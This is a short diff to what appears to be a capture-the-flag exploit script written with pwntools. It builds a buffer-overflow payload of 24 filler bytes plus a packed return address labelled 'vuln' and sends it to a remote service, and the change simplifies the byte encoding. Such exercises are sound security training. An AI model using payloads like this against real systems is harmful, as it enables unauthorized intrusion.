@@ -9,9 +9,7 @@ offeset = 24
 vuln = 0x00000000004006d7
 p = remote(HOST, REMOTE)
 p.recvline()
-# print(p64(vuln))
-payload = 'A' * offeset
-payload = payload.encode()
+payload = b'A' * offeset
 payload += p64(vuln)
 p.sendline(payload.strip())
 p.recvline()
